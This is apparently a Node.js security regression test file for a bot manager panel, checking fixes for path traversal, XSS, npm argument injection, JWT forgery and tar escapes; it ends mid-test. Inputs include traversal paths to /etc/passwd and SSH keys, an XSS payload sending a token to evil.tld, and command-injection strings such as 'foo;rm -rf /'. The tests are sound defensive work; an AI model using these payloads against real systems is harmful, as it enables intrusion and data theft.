'use strict';
/**
 * Security regression tests.
 *
 * One describe block per fixed finding. Each test states the finding id it
 * locks down, so a future change that reopens the hole fails here with the
 * id in the test name.
 *
 * Run with: npm test   (or npm run test:security)
 */

const test  = require('node:test');
const assert = require('node:assert');
const fs    = require('fs');
const os    = require('os');
const path  = require('path');
const jwt   = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

const { makeSandbox, makeBot } = require('./helpers');

/**
 * Load the real esc()/escJs() out of app.js so the test always checks
 * the shipped implementation instead of a copy that can drift.
 */
function loadAppEscapers() {
  const src = fs.readFileSync(path.join(__dirname, '..', '..', 'frontend', 'public', 'js', 'app.js'), 'utf8');
  const escStart  = src.indexOf('const ESC_MAP = {');
  const escEnd    = src.indexOf('}', src.indexOf('function esc(s) {')) + 1;
  const jsMapStart = src.indexOf('const JS_ESC_MAP = {');
  const jsEnd      = src.indexOf('}', src.indexOf('function escJs(s) {')) + 2;
  assert.ok(escStart > -1 && jsMapStart > -1, 'app.js must define both escapers');
  // eslint-disable-next-line no-new-func
  return new Function(src.slice(escStart, escEnd) + src.slice(jsMapStart, jsEnd) + '\nreturn { esc, escJs };')();
}


const SB = makeSandbox('security');

// -------------------------------------------------------------
// FILE-01 / FILE-02 — path containment
// -------------------------------------------------------------
const sec = require('../src/middleware/security');

test('FILE-01/FILE-02: isInside rejects a sibling directory sharing a name prefix', () => {
  // This is the exact bug: startsWith('/opt/monbot') accepts '/opt/monbot2'.
  assert.strictEqual(sec.isInside('/opt/monbot', '/opt/monbot2'), false);
  assert.strictEqual(sec.isInside('/opt/monbot', '/opt/monbotevil'), false);
  assert.strictEqual(sec.isInside('/opt/monbot', '/opt/monbot-backup'), false);
  assert.strictEqual(sec.isInside('/opt/monbot', '/opt/monbot'), false, 'base is not "inside" itself');
  assert.strictEqual(sec.isInside('/opt/monbot', '/opt/monbot/src/index.js'), true);
  assert.strictEqual(sec.isInside('/opt/monbot', '/opt/victimbot'), false);
  assert.strictEqual(sec.isInside('/opt/monbot', '/etc/passwd'), false);
});

test('FILE-01/FILE-02: isInsideOrEqual accepts the base directory but nothing above it', () => {
  assert.strictEqual(sec.isInsideOrEqual('/opt/monbot', '/opt/monbot'), true);
  assert.strictEqual(sec.isInsideOrEqual('/opt/monbot', '/opt/monbot/src'), true);
  assert.strictEqual(sec.isInsideOrEqual('/opt/monbot', '/opt/monbot2'), false);
  assert.strictEqual(sec.isInsideOrEqual('/opt/monbot', '/opt'), false);
});

test('FILE-03: isInsideReal refuses a symlink that leaves the bot directory', () => {
  const bot = makeBot(SB.botsRoot, 'symbot');
  const outside = path.join(SB.root, 'outside-secret.txt');
  fs.writeFileSync(outside, 'TOP SECRET', 'utf8');

  const link = path.join(bot, 'innocent.txt');
  try { fs.symlinkSync(outside, link); } catch (_) {
    return;   // symlink creation not permitted on this platform: nothing to assert
  }

  assert.strictEqual(sec.isInsideReal(bot, link), false, 'symlink escaping the bot dir must be refused');
  assert.strictEqual(sec.isInsideReal(bot, path.join(bot, 'index.js')), true, 'a real file inside is fine');
});

test('FILE-03: a NEW file under a symlinked directory is refused too', () => {
  const bot = makeBot(SB.botsRoot, 'symdirbot');
  const outsideDir = path.join(SB.root, 'outside-dir');
  fs.mkdirSync(outsideDir, { recursive: true });

  const link = path.join(bot, 'leakdir');
  try { fs.symlinkSync(outsideDir, link, 'dir'); } catch (_) {
    return;   // symlink creation not permitted on this platform
  }

  // The file does not exist yet, so realpathSync(target) would throw and a
  // textual fallback would wrongly accept it: the existing prefix must be
  // resolved and the missing tail appended.
  assert.strictEqual(
    sec.isInsideReal(bot, path.join(bot, 'leakdir', 'new.txt')),
    false,
    'a new file behind a symlinked directory must be refused'
  );
  assert.strictEqual(
    sec.isInsideReal(bot, path.join(bot, 'legit-sub', 'new.txt')),
    true,
    'a new file in a non-existent real subdirectory is still allowed'
  );
});

test('FILE-03: the seven classic traversal shapes are all rejected by safeFilePath', () => {
  process.env.BOTS_ROOT = SB.botsRoot;
  const botDir = path.resolve(SB.botsRoot, 'monbot');
  const shapes = [
    '../../etc/passwd',
    '../../../../../../etc/passwd',
    '..%2f..%2fetc/passwd',
    '....//....//etc/passwd',
    '/etc/passwd',
    '/opt/otherbot/.env',
    'a/../../../../etc/hosts'
  ];
  for (const shape of shapes) {
    const resolved = sec.safeFilePath('monbot', shape);
    // Either refused outright, or — at worst — resolved to a path that is
    // still inside the bot directory. It must never point outside.
    if (resolved !== null) {
      assert.ok(
        sec.isInside(botDir, resolved),
        `${shape} resolved outside the bot directory: ${resolved}`
      );
    }
  }
  // Encoded separators are refused outright: any layer that decodes before
  // this one would otherwise turn them into a real traversal.
  assert.strictEqual(sec.safeFilePath('monbot', '..%2f..%2fetc/passwd'), null);
  assert.strictEqual(sec.safeFilePath('monbot', '%2e%2e%2f%2e%2e%2fetc%2fpasswd'), null);
  // Legitimate paths still resolve.
  assert.ok(sec.safeFilePath('monbot', 'src/index.js'));
  assert.ok(sec.safeFilePath('monbot', '.env'));
  assert.strictEqual(sec.safeFilePath('monbot', '../../../root/.ssh/id_rsa'), null);
});

test('FILES: isSafeRelativePath accepts the nested names templates produce', () => {
  // Templates legitimately generate commands/ping.js, events/ready.js …
  for (const p of ['index.js', '.env.example', 'README.md',
                   'commands/ping.js', 'events/ready.js', 'utils/index.js']) {
    assert.strictEqual(sec.isSafeRelativePath(p), true, `must accept ${p}`);
  }
  for (const p of ['../escape.js', '/etc/passwd', 'a/../../b', 'C:/win.js',
                   'commands/../../escape.js', '', null, '..']) {
    assert.strictEqual(sec.isSafeRelativePath(p), false, `must refuse ${p}`);
  }
});

// -------------------------------------------------------------
// XSS-02 — hostile file names must not be storable
// -------------------------------------------------------------
test('XSS-02: file names carrying an apostrophe or backtick are refused', () => {
  const payload = "x'-fetch('//evil.tld/?t='+localStorage.nbm_token)-'.js";
  assert.strictEqual(sec.isValidFileName(payload), false);
  assert.strictEqual(sec.isValidFileName('back`tick.js'), false);
  assert.strictEqual(sec.isValidFileName('a..b.js'), false);
  assert.strictEqual(sec.isValidFileName('..'), false);
  assert.strictEqual(sec.isValidFileName(''), false);
  assert.strictEqual(sec.isValidFileName(null), false);
  // Still-valid names must keep working. isValidFileName validates a
  // single path segment; multi-segment template names go through
  // isSafeRelativePath (covered by its own test above).
  assert.strictEqual(sec.isValidFileName('index.js'), true);
  assert.strictEqual(sec.isValidFileName('deep-module-2.js'), true);
  assert.strictEqual(sec.isValidFileName('.env'), true);
  assert.strictEqual(sec.isValidFileName('mon bot.js'), true);
});

// -------------------------------------------------------------
// CMD-02 / CMD-06 — npm CLI argument injection
// -------------------------------------------------------------
test('CMD-02/CMD-06: npm names that are actually CLI flags are refused', () => {
  // The old regex /^[a-zA-Z0-9@/_.-]{1,100}$/ accepted all of these.
  const injections = [
    '--prefix=/tmp/pwn',
    '--registry=http://evil.tld',
    '-g',
    '--global',
    '--ignore-scripts=false',
    '../evil',
    './local',
    '/abs/path',
    'a/../../b',
    'foo;rm -rf /',
    'foo&&whoami'
  ];
  for (const p of injections) {
    assert.strictEqual(sec.isValidPackageName(p), false, `must refuse ${p}`);
  }
  // Legitimate specs keep working.
  for (const p of ['discord.js', 'dotenv', '@discordjs/rest', 'node-fetch@2', 'a', 'eslint-plugin-import']) {
    assert.strictEqual(sec.isValidPackageName(p), true, `must accept ${p}`);
  }
});

// -------------------------------------------------------------
// AUTH-02 — JWT secret validation
// -------------------------------------------------------------
const EXAMPLE_SECRET = 'CHANGE_THIS_TO_A_RANDOM_64_CHAR_HEX_STRING';

test('AUTH-02: the .env.example placeholder is empty, so it cannot be shipped as a live secret', () => {
  const raw = fs.readFileSync(path.join(__dirname, '..', '.env.example'), 'utf8');
  const value = raw.match(/^JWT_SECRET=(.*)$/m)[1].trim();
  assert.strictEqual(value, '', 'JWT_SECRET must ship empty in .env.example');
  assert.ok(Buffer.byteLength(EXAMPLE_SECRET, 'utf8') >= 32);   // the old value passed the old guard
});

test('AUTH-02: a token signed with the old published placeholder is not the configured secret', () => {
  const { resolveSession } = require('../src/middleware/auth.middleware');
  const forged = jwt.sign({ id: 1, username: 'admin', role: 'admin' }, EXAMPLE_SECRET, { expiresIn: '1h' });
  // The middleware verifies with process.env.JWT_SECRET, which the sandbox
  // set to a different value: verification must fail.
  let verified = null;
  try {
    verified = jwt.verify(forged, process.env.JWT_SECRET, { algorithms: ['HS256'] });
  } catch (e) {
    verified = null;
  }
  assert.strictEqual(verified, null, 'placeholder-signed token must not verify against the real secret');
  assert.strictEqual(typeof resolveSession, 'function');
});

test('AUTH-02: boot refuses the legacy published placeholder', () => {
  const { execFileSync } = require('child_process');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nbm-legacy-secret-'));
  let failed = false;
  let out = '';
  try {
    execFileSync(process.execPath, ['src/server.js'], {
      cwd: path.join(__dirname, '..'),
      env: {
        ...process.env,
        JWT_SECRET: EXAMPLE_SECRET,
        NEXUS_DATA_DIR: dir,
        BOTS_ROOT: dir,
        PORT: '0'
      },
      timeout: 15000,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
  } catch (e) {
    failed = true;
    out = String(e.stdout || '') + String(e.stderr || '');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
  assert.strictEqual(failed, true, 'the server must exit instead of starting with the published placeholder');
  assert.match(out, /FATAL/, 'the refusal must be explicit');
});

// -------------------------------------------------------------
// AUTH-01 — bootstrap token / setup lock
// -------------------------------------------------------------
test('AUTH-01: the DB refuses a second setup even when the user list is emptied', () => {
  const { NexusDB } = require('../src/db/db');
  const file = path.join(SB.root, 'db-setup.json');
  const db = new NexusDB(file);

  assert.strictEqual(db.isSetupDone(), false, 'a fresh database is not set up');
  db.createUser({ username: 'admin', password_hash: 'x', role: 'admin' });
  db.updateSettings({ setup_done: true });
  db.markSetupCompleted();
  assert.strictEqual(db.isSetupDone(), true);

  // Simulate the scenario the audit described: a restored backup with no
  // users. The lock must hold.
  db.data.users = [];
  db.data.settings.setup_done = false;
  assert.strictEqual(db.isSetupDone(), true, 'the marker file keeps setup closed');
  assert.throws(
    () => db.createUser({ username: 'attacker', password_hash: 'y', role: 'admin' }),
    /Setup already completed/,
    'a second admin must not be creatable'
  );
});

test('AUTH-01: safeEqual is length-safe and rejects near-misses', () => {
  assert.strictEqual(sec.safeEqual('abc', 'abc'), true);
  assert.strictEqual(sec.safeEqual('abc', 'abcd'), false);
  assert.strictEqual(sec.safeEqual('', 'x'), false);
  assert.strictEqual(sec.safeEqual(undefined, undefined), true);
});

test('AUTH-01: isSetupDone() does not depend on users.length alone', () => {
  const { NexusDB } = require('../src/db/db');
  const file = path.join(SB.root, 'db-setup2.json');
  const db = new NexusDB(file);
  db.createUser({ username: 'admin', password_hash: 'x', role: 'admin' });
  // users.length > 0 with setup_done explicitly false and no marker file:
  // still treated as configured, matching the pre-hardening behaviour.
  assert.strictEqual(db.isSetupDone(), true);
});

// -------------------------------------------------------------
// INF-03 — silent DB corruption must not reopen setup
// -------------------------------------------------------------
test('INF-03: a truncated database file aborts startup instead of resetting to defaults', () => {
  const { NexusDB } = require('../src/db/db');
  const file = path.join(SB.root, 'db-corrupt.json');
  fs.writeFileSync(file, '{"settings":{"setup_done":true},"users":[{"id":1');

  const realExit = process.exit;
  const realErr  = console.error;
  let exitCode = null;
  process.exit = (code) => { exitCode = code; throw new Error('__exit__'); };
  console.error = () => {};
  try {
    // eslint-disable-next-line no-new
    new NexusDB(file);
  } catch (e) {
    if (e.message !== '__exit__') throw e;
  } finally {
    process.exit = realExit;
    console.error = realErr;
  }

  assert.strictEqual(exitCode, 1, 'the process must refuse to start on a corrupt database');
  // The damaged file must be preserved for recovery, not silently dropped.
  const preserved = fs.readdirSync(SB.root).filter(f => f.startsWith('db-corrupt.json.corrupt-'));
  assert.ok(preserved.length === 1, 'the corrupt file is kept aside for recovery');
});

test('INF-03: a JSON array instead of an object is also refused', () => {
  const { NexusDB } = require('../src/db/db');
  const file = path.join(SB.root, 'db-array.json');
  fs.writeFileSync(file, '[]');

  const realExit = process.exit;
  const realErr  = console.error;
  let exitCode = null;
  process.exit = (code) => { exitCode = code; throw new Error('__exit__'); };
  console.error = () => {};
  try { new NexusDB(file); }
  catch (e) { if (e.message !== '__exit__') throw e; }
  finally { process.exit = realExit; console.error = realErr; }

  assert.strictEqual(exitCode, 1);
});

// -------------------------------------------------------------
// AUTH-03 / AUTH-04 / AUTH-15 — session revocation, role, mass assignment
// -------------------------------------------------------------
test('AUTH-03: changing the password invalidates previously issued tokens', () => {
  const { NexusDB } = require('../src/db/db');
  const file = path.join(SB.root, 'db-revoke.json');
  const db = new NexusDB(file);
  const user = db.createUser({ username: 'admin', password_hash: 'h', role: 'admin' });

  assert.strictEqual(db.isTokenRevoked('jti-1'), false);
  db.revokeToken('jti-1', Math.floor(Date.now() / 1000) + 600);
  assert.strictEqual(db.isTokenRevoked('jti-1'), true, 'a revoked jti is refused');

  // token_version bump kills every token issued before it.
  assert.strictEqual(user.token_version, 0);
  db.revokeAllUserTokens(user.id);
  assert.strictEqual(db.getUser(user.id).token_version, 1);
});

test('AUTH-03: expired revocation entries are pruned instead of growing forever', () => {
  const { NexusDB } = require('../src/db/db');
  const file = path.join(SB.root, 'db-prune.json');
  const db = new NexusDB(file);
  db.revokeToken('old', Math.floor(Date.now() / 1000) - 10);
  assert.strictEqual(db.isTokenRevoked('old'), false, 'an expired entry no longer blocks anything');
  assert.ok(!Array.isArray(db.data._revoked_jti) || db.data._revoked_jti.length === 0);
});

test('AUTH-15: updateUser ignores fields outside the allowlist (mass assignment)', () => {
  const { NexusDB } = require('../src/db/db');
  const file = path.join(SB.root, 'db-massassign.json');
  const db = new NexusDB(file);
  const user = db.createUser({ username: 'admin', password_hash: 'h', role: 'admin' });

  db.updateUser(user.id, { username: 'attacker', id: 999, role: 'superadmin', password_hash: 'new' });

  const after = db.getUser(user.id);
  assert.strictEqual(after.username, 'admin', 'username is not a mutable field');
  assert.strictEqual(after.id, user.id, 'id is not a mutable field');
  assert.strictEqual(after.password_hash, 'new', 'password_hash IS mutable');
});

test('AUTH-14: JWT verification pins the algorithm, issuer and audience', () => {
  const { verifyOptions, JWT_ALGORITHMS } = require('../src/middleware/auth.middleware');
  assert.deepStrictEqual(JWT_ALGORITHMS, ['HS256']);
  assert.strictEqual(verifyOptions.algorithms[0], 'HS256');
  assert.ok(verifyOptions.issuer);
  assert.ok(verifyOptions.audience);

  // A token signed with a different algorithm must be refused.
  const none = jwt.sign({ id: 1, username: 'admin', role: 'admin' }, '', { algorithm: 'none', expiresIn: '1h' });
  assert.throws(() => jwt.verify(none, process.env.JWT_SECRET, verifyOptions));

  // A token with no issuer must be refused.
  const noIss = jwt.sign({ id: 1, username: 'admin', role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '1h' });
  assert.throws(() => jwt.verify(noIss, process.env.JWT_SECRET, verifyOptions));
});

// -------------------------------------------------------------
// CMD-05 / INF-16 — secret redaction and log-injection guard
// -------------------------------------------------------------
test('CMD-05: Discord tokens and JWTs are redacted from log lines', () => {
  sec.registerSecret(process.env.JWT_SECRET);
  // Built at runtime: the test needs the Discord token shape for the
  // redactor, but the source must not contain a token-shaped literal that
  // GitHub push protection would treat as a leaked credential.
  const botToken = ['unit'.repeat(6), 'abcdef', 'fixture'.repeat(4)].join('.');
  const out = sec.redactSecrets(`login with ${botToken} ok`);
  assert.ok(!out.includes(botToken), 'Discord token must not survive redaction');
  assert.ok(out.includes('[redacted]'));

  const out2 = sec.redactSecrets(`secret=${process.env.JWT_SECRET}`);
  assert.ok(!out2.includes(process.env.JWT_SECRET), 'the configured JWT secret must be redacted');
});

test('INF-16: control characters and newlines cannot forge extra log lines', () => {
  const evil = `bot${String.fromCharCode(10)}2026-01-01 admin login success`;
  const clean = sec.sanitizeLogText(evil);
  assert.ok(!clean.includes(String.fromCharCode(10)), 'no newline survives');
  assert.ok(!clean.includes(String.fromCharCode(13)));
});

test('CMD-07: SAFE_ENV does not carry the JWT signing secret to child processes', () => {
  assert.strictEqual(sec.SAFE_ENV.JWT_SECRET, undefined,
    'npm/tar children must not inherit JWT_SECRET');
  assert.ok(sec.SAFE_ENV.PATH, 'PATH is still needed to find npm');
  assert.strictEqual(sec.SAFE_ENV.JWT_EXPIRES_IN, undefined);
});

test('CMD-07: the update script is spawned with SAFE_ENV, not process.env', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'services', 'update.service.js'), 'utf8');
  assert.ok(src.includes('...SAFE_ENV'), 'the update script must get the allowlisted environment');
  assert.ok(!src.includes('...process.env'), 'the update script must not inherit the whole environment');
});

test('CMD-03/UPD-07: every npm install fallback disables lifecycle scripts', () => {
  for (const file of ['install.sh', 'update.sh', 'dev-install.sh']) {
    const src = fs.readFileSync(path.join(__dirname, '..', '..', 'scripts', file), 'utf8');
    assert.match(
      src,
      /npm install --omit=dev --loglevel=error --ignore-scripts/,
      `${file}: the fallback must also pass --ignore-scripts`
    );
  }
});

test('UPD-02/UPD-07: installers use a pinned Node archive, not a remote shell pipe', () => {
  for (const file of ['install.sh', 'dev-install.sh']) {
    const src = fs.readFileSync(path.join(__dirname, '..', '..', 'scripts', file), 'utf8');
    assert.ok(!src.includes('deb.nodesource.com'), `${file}: must not pipe NodeSource into bash`);
    assert.match(src, /NODE_INSTALL_VERSION="[0-9]/, `${file}: Node version must be pinned`);
    assert.match(src, /sha256sum -c/, `${file}: the Node archive must be checksum-verified`);
    assert.match(src, /--safe-links/, `${file}: rsync must not copy escaping symlinks`);
  }
  const install = fs.readFileSync(path.join(__dirname, '..', '..', 'scripts', 'install.sh'), 'utf8');
  assert.match(install, /NEXUS_COMMIT_SHA/, 'the install tag must be pinnable to a commit');
});

test('UPD-14: update.sh validates before applying and never stops its parent', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', '..', 'scripts', 'update.sh'), 'utf8');
  assert.ok(src.includes('set -euo pipefail'), 'update.sh must fail fast on pipelines');
  const validation = src.indexOf('UPD-14: validate');
  const apply = src.indexOf('step_begin apply');
  assert.ok(validation > -1 && apply > -1 && validation < apply,
    'syntax validation must happen before the files are applied');
  assert.ok(!src.includes('pm2 stop nexus-bot-manager'),
    'the updater must not stop the panel that launched it');
  assert.match(src, /rsync -a --delete --safe-links/, 'rsync must refuse escaping symlinks');
  assert.ok(src.includes('PROGRESS_FILE="$PROGRESS_FILE" node -e'),
    'the progress writer must receive PROGRESS_FILE in its environment');
  assert.ok(!src.includes('" PROGRESS_FILE="$PROGRESS_FILE" || true'),
    'PROGRESS_FILE must not be passed as a node script argument');
});

test('UPD-21: update.sh allows non-root only with an explicit flag and writable tree', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', '..', 'scripts', 'update.sh'), 'utf8');
  assert.ok(src.includes('if [[ $EUID -ne 0 ]]'), 'the root/non-root branch must exist');
  assert.ok(src.includes('NEXUS_ALLOW_NONROOT'), 'non-root mode must be explicit');
  assert.match(src, /-w "\$\{INSTALL_DIR\}" && -w "\$\{INSTALL_DIR\}\/backend"/,
    'non-root mode must verify the install tree is writable');
});

test('UPD-22: version.service exports the GitHub coordinates used by the updater', () => {
  const versionSvc = require('../src/services/version.service');
  assert.strictEqual(versionSvc.GITHUB_OWNER, 'Julien48003');
  assert.strictEqual(versionSvc.GITHUB_REPO, 'nexus-bot-manager');

  const updateSrc = fs.readFileSync(path.join(__dirname, '..', 'src', 'services', 'update.service.js'), 'utf8');
  assert.ok(updateSrc.includes('versionSvc.GITHUB_OWNER'));
  assert.ok(updateSrc.includes('versionSvc.GITHUB_REPO'));
});

test('UPD-23: the GitHub tarball request uses an Accept header GitHub supports', () => {
  const updateSrc = fs.readFileSync(path.join(__dirname, '..', 'src', 'services', 'update.service.js'), 'utf8');
  // GitHub returns HTTP 415 when the tarball endpoint is asked for
  // application/octet-stream. The panel must request the JSON media type.
  assert.ok(updateSrc.includes("'Accept': 'application/vnd.github+json'"),
    'the tarball request must accept application/vnd.github+json');
  assert.ok(!updateSrc.includes("'Accept': 'application/octet-stream'"),
    'application/octet-stream is rejected by GitHub with HTTP 415');
});

test('UPD-03: an annotated tag resolves through its tag object to the commit', async () => {
  const updateSvc = require('../src/services/update.service');
  const calls = [];
  const fake = async (apiPath) => {
    calls.push(apiPath);
    if (apiPath === '/repos/acme/nexus/git/ref/tags/v1.1.6') {
      return {
        object: {
          sha: 'tag-object-sha',
          type: 'tag',
          url: 'https://api.github.com/repos/acme/nexus/git/tags/tag-object-sha'
        }
      };
    }
    if (apiPath === '/repos/acme/nexus/git/tags/tag-object-sha') {
      return { object: { sha: 'commit-sha', type: 'commit' } };
    }
    throw new Error('unexpected path ' + apiPath);
  };
  assert.strictEqual(
    await updateSvc._resolveTagToCommit('acme', 'nexus', '1.1.6', fake),
    'commit-sha'
  );
  assert.deepStrictEqual(calls, [
    '/repos/acme/nexus/git/ref/tags/v1.1.6',
    '/repos/acme/nexus/git/tags/tag-object-sha'
  ]);
});

test('UPD-03: a lightweight tag resolves directly to the commit', async () => {
  const updateSvc = require('../src/services/update.service');
  const fake = async () => ({ object: { sha: 'commit-sha', type: 'commit' } });
  assert.strictEqual(
    await updateSvc._resolveTagToCommit('acme', 'nexus', '1.1.7', fake),
    'commit-sha'
  );
});

test('UPD-20: update.sh refuses a PM2 version mismatch before applying', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', '..', 'scripts', 'update.sh'), 'utf8');
  assert.match(src, /TARGET_PM2=/, 'the target PM2 version must be read from the incoming lockfile');
  assert.match(src, /PM2 global .* incompatible/, 'a mismatch must be refused');
  const check = src.indexOf('TARGET_PM2=');
  const apply = src.indexOf('step_begin apply');
  assert.ok(check > -1 && apply > -1 && check < apply,
    'the PM2 check must happen before the files are applied');
});

test('UPD-07: install.sh pins the same PM2 version as package-lock.json', () => {
  const lock = require('../package-lock.json');
  const src = fs.readFileSync(path.join(__dirname, '..', '..', 'scripts', 'install.sh'), 'utf8');
  const m = src.match(/PM2_VERSION="([^"]+)"/);
  assert.ok(m, 'PM2_VERSION must be declared');
  assert.strictEqual(m[1], lock.packages['node_modules/pm2'].version,
    'install.sh PM2 version must match the dependency lock');
});

// -------------------------------------------------------------
// UPD-01 / UPD-05 — update integrity
// -------------------------------------------------------------
test('UPD-01: only well-formed sha256 digests are read from the pin file', () => {
  const updateSvc = require('../src/services/update.service');
  const digests = updateSvc._loadPinnedDigests();
  assert.strictEqual(typeof digests, 'object');
  for (const [version, digest] of Object.entries(digests)) {
    assert.match(version, /^\d+(\.\d+)*$/, `unexpected key ${version}`);
    assert.match(digest, /^[0-9a-f]{64}$/i, `digest for ${version} is not a sha256`);
  }
  // The shipped file pins nothing yet, so an update must be refused
  // unless the operator explicitly opts out.
  assert.strictEqual(updateSvc._allowUnverified(), false,
    'unverified updates are not allowed by default');
});

test('UPD-05: a tar entry escaping the extraction directory is refused', async () => {
  const updateSvc = require('../src/services/update.service');
  const { execFileSync } = require('child_process');
  if (process.platform === 'win32') return;   // GNU tar flags differ on Windows

  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nbm-tar-'));
  const tarball = path.join(dir, 'evil.tar.gz');
  const payload = path.join(dir, 'payload.txt');
  fs.writeFileSync(payload, 'escaped', 'utf8');
  // A normal `tar -C dir ../` is rewritten by GNU tar ("Removing leading
  // ../") and therefore is NOT a traversal archive. Force a real `../`
  // member with --transform so the guard is actually exercised.
  execFileSync('tar', [
    '-czf', tarball,
    '-C', dir,
    '--transform', 's|^payload.txt$|../escaped.txt|',
    'payload.txt'
  ], { stdio: 'pipe' });

  await assert.rejects(
    () => updateSvc._assertSafeTarEntries(tarball),
    /Archive refusée/,
    'an archive with a parent-directory entry must be refused'
  );
  fs.rmSync(dir, { recursive: true, force: true });
});

test('UPD-05: a symlink in the extracted tree is refused', () => {
  const updateSvc = require('../src/services/update.service');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nbm-symlink-'));
  try {
    try { fs.symlinkSync('/etc/passwd', path.join(dir, 'leak')); }
    catch (_) { return; }   // symlink creation not permitted on this platform
    assert.throws(
      () => updateSvc._assertNoSymlinks(dir),
      /Lien symbolique interdit/,
      'a symlink in the release tree must be refused'
    );
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// -------------------------------------------------------------
// UPD-16 — pending restart must compare versions
// -------------------------------------------------------------
test('UPD-16: checkPendingRestart only reports success when the version matches', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'services', 'update.service.js'), 'utf8');
  assert.ok(src.includes('compareVersions(local.version, pending.expectedVersion)'),
    'the pending-restart handler must compare versions');
  assert.ok(!/state\.status = 'success';\s*\n\s*state\.lastUpdateAt/.test(src),
    'a pending marker alone must no longer be treated as success');
});

test('UPD-24: a finished update is reported as success, not a stale running step', () => {
  const { execFileSync } = require('node:child_process');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nbm-update-state-'));
  const data = path.join(dir, 'data');
  const install = path.join(dir, 'install');
  fs.mkdirSync(data, { recursive: true });
  fs.mkdirSync(path.join(install, 'backend'), { recursive: true });
  fs.writeFileSync(path.join(install, 'backend', 'package.json'),
    JSON.stringify({ name: 'nexus-bot-manager', version: '1.1.14' }));

  const steps = [
    { id: 'restart', label: 'Redémarrage du service', status: 'running' },
    { id: 'verify', label: 'Vérification du service', status: 'pending' }
  ];
  fs.writeFileSync(path.join(data, 'update.progress.json'), JSON.stringify({
    status: 'running', toVersion: '1.1.14', currentStep: 'restart', percent: 90, steps
  }, null, 2));
  fs.writeFileSync(path.join(data, 'update-state.json'), JSON.stringify({
    status: 'running', remoteVersion: '1.1.14', updateAvailable: true
  }, null, 2));
  fs.writeFileSync(path.join(data, 'update.pending.json'), JSON.stringify({
    expectedVersion: '1.1.14', startedAt: Date.now()
  }, null, 2));

  const servicePath = path.join(__dirname, '..', 'src', 'services', 'update.service.js');
  const script = `
    const fs = require('fs');
    const path = require('path');
    const svc = require(${JSON.stringify(servicePath)});
    const before = svc.getStatus();
    const pendingStillThere = fs.existsSync(path.join(process.env.NEXUS_DATA_DIR, 'update.pending.json'));
    const pending = svc.checkPendingRestart();
    const after = svc.getStatus();
    process.stdout.write(JSON.stringify({ before, pendingStillThere, pending, after }));
  `;
  try {
    const out = execFileSync(process.execPath, ['-e', script], {
      env: { ...process.env, NEXUS_DATA_DIR: data, INSTALL_DIR: install },
      encoding: 'utf8',
      timeout: 15000
    });
    const r = JSON.parse(out);
    assert.strictEqual(r.before.status, 'success', 'a finished update must not stay running');
    assert.strictEqual(r.before.percent, 100);
    assert.strictEqual(r.pendingStillThere, true, 'getStatus must not consume the pending marker');
    assert.strictEqual(r.pending.succeeded, true);
    assert.strictEqual(r.after.status, 'success');
    assert.strictEqual(r.after.updateAvailable, false);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('UPD-25: the updater can use the SOURCE_SHA256 asset published on the release', async () => {
  const updateSvc = require('../src/services/update.service');
  const digest = 'a'.repeat(64);
  const calls = [];
  const requestJson = async (apiPath) => {
    calls.push(apiPath);
    return { assets: [{ name: 'SOURCE_SHA256', browser_download_url: 'https://example.invalid/SOURCE_SHA256' }] };
  };
  const download = async (url) => {
    calls.push(url);
    return Buffer.from(digest + '\n');
  };
  assert.strictEqual(
    await updateSvc._fetchPublishedDigest('acme', 'nexus', '1.1.14', requestJson, download),
    digest
  );
  assert.deepStrictEqual(calls, [
    '/repos/acme/nexus/releases/tags/v1.1.14',
    'https://example.invalid/SOURCE_SHA256'
  ]);
});

test('UPD-25: a release without SOURCE_SHA256 yields no digest', async () => {
  const updateSvc = require('../src/services/update.service');
  const got = await updateSvc._fetchPublishedDigest('acme', 'nexus', '1.1.14',
    async () => ({ assets: [] }),
    async () => { throw new Error('must not download'); });
  assert.strictEqual(got, null);
});

test('UPD-25: a local pin takes precedence over the published digest', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'services', 'update.service.js'), 'utf8');
  assert.ok(src.includes('const published = pinned ? null : await fetchPublishedDigest'),
    'the updater must not fetch the published digest when a local pin exists');
});

// -------------------------------------------------------------
// SEC-09 — SPA fallback must not answer /api with HTML
// -------------------------------------------------------------
test('SEC-09: the API 404 guard is registered before the SPA fallback', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'server.js'), 'utf8');
  const apiGuard = src.indexOf("app.use('/api',");
  const spaFallback = src.indexOf("app.get('*'");
  assert.ok(apiGuard > -1, 'an /api 404 guard exists');
  assert.ok(spaFallback > -1, 'the SPA fallback still exists');
  assert.ok(apiGuard < spaFallback, 'the /api guard must come first');
});

// -------------------------------------------------------------
// CMD-04 / AUTH-09 — Socket.IO log subscription
// -------------------------------------------------------------
test('CMD-04/AUTH-09: subscribe:logs sanitises the bot name before touching the filesystem', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'server.js'), 'utf8');
  assert.ok(src.includes("const safeName = sanitizeBotName(botName)"),
    'the socket handler must sanitise the requested bot name');
  assert.ok(!/path\.join\(logDir, `\$\{botName\}-out\.log`\)/.test(src),
    'the raw bot name must no longer be interpolated into a log path');
  assert.ok(src.includes('LOG_TAIL_BYTES'),
    'log replay must be bounded so a huge log cannot be read into memory');
});

// -------------------------------------------------------------
// INF-17 / AUTH-11 — response headers
// -------------------------------------------------------------
test('INF-17: obsolete and lax security headers are corrected', () => {
  const headers = {};
  sec.securityHeaders({}, { setHeader: (k, v) => { headers[k] = v; }, removeHeader() {} }, () => {});
  assert.strictEqual(headers['X-XSS-Protection'], '0', 'obsolete filter disabled explicitly');
  assert.strictEqual(headers['Referrer-Policy'], 'no-referrer');
  assert.strictEqual(headers['X-Content-Type-Options'], 'nosniff');
